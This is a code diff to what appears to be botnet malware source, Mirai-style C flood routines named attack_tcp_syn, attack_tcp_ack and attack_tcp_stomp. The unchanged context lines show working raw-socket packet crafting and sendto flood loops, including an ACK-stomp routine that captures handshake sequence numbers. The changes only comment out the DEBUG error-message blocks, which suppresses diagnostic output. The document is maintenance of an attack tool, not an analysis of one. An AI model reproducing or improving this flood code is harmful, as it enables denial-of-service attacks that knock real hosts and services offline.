@@ -36,19 +36,19 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
-#endif
+#endif*/
         return;
     }
     
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif
+#endif*/
         close(fd);
         return;
     }
@@ -149,12 +149,12 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
             targs[i].sock_addr.sin_port = tcph->dest;
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
-        }
+        }/*
 #ifdef DEBUG
             break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
-#endif
+#endif*/
     }
 }
 
@@ -181,18 +181,18 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
-#endif
+#endif*/
         return;
     }
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif
+#endif*/
         close(fd);
         return;
     }
@@ -281,12 +281,12 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
             targs[i].sock_addr.sin_port = tcph->dest;
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
-        }
+        }/*
 #ifdef DEBUG
             break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
-#endif
+#endif*/
     }
 }
 
@@ -311,18 +311,18 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
 
     // Set up receive socket
     if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Could not open raw socket!\n");
-#endif
+#endif*/
         return;
     }
     i = 1;
     if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif
+#endif*/
         close(rfd);
         return;
     }
@@ -339,10 +339,10 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
         stomp_setup_nums:
 
         if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
-        {
+        {/*
 #ifdef DEBUG
             printf("Failed to create socket!\n");
-#endif
+#endif*/
             continue;
         }
 
@@ -372,10 +372,10 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
             recv_addr_len = sizeof (struct sockaddr_in);
             ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
             if (ret == -1)
-            {
+            {/*
 #ifdef DEBUG
                 printf("Could not listen on raw socket!\n");
-#endif
+#endif*/
                 return;
             }
             if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
@@ -394,10 +394,10 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
                         stomp_data[i].seq = ntohl(tcph->seq);
                         stomp_data[i].ack_seq = ntohl(tcph->ack_seq);
                         stomp_data[i].sport = tcph->dest;
-                        stomp_data[i].dport = addr.sin_port;
+                        stomp_data[i].dport = addr.sin_port;/*
 #ifdef DEBUG
                         printf("ACK Stomp got SYN+ACK!\n");
-#endif
+#endif*/
                         // Set up the packet
                         pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                         iph = (struct iphdr *)pkts[i];
@@ -443,10 +443,10 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
             }
 
             if (time(NULL) - start_recv > 10)
-            {
+            {/*
 #ifdef DEBUG
                 printf("Couldn't connect to host for ACK Stomp in time. Retrying\n");
-#endif
+#endif*/
                 close(fd);
                 goto stomp_setup_nums;
             }
@@ -479,11 +479,11 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
 
             targs[i].sock_addr.sin_port = tcph->dest;
             sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
-        }
+        }/*
 #ifdef DEBUG
             break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
-#endif
+#endif*/
     }
 }
